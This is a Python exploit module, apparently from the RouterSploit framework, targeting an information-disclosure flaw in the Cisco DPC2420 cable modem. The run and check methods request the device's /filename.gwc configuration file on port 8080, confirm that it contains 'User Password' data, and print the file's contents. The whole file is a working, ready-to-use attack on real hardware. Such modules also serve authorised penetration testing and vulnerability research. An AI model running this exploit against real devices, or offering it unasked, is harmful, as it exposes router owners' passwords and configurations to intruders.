from routersploit import (
    exploits,
    print_success,
    print_error,
    print_info,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Cisco DPC2420 Information Disclosure vulnerability.
    If the target is vulnerable it allows to read sensitive information from the configuration file.
    """
    __info__ = {
        'name': 'Cisco DPC2420 Info Disclosure',
        'description': 'Module exploits Cisco DPC2420 information disclosure vulnerability '
                       'which allows reading sensitive information from the configuration file.',
        'authors': [
            'Facundo M. de la Cruz (tty0) <fmdlc[at]code4life.com.ar>',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/23250/',
        ],
        'devices': [
            'Cisco DPC2420',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(8080, 'Target Port')

    def run(self):
        url = "{}:{}/filename.gwc".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return

        if response.status_code == 200 and "User Password" in response.text:
            print_success("Exploit success - reading configuration file filename.gwc")
            print_info(response.text)
        else:
            print_error("Exploit failed - could not read configuration file")

    @mute
    def check(self):
        url = "{}:{}/filename.gwc".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and "User Password" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
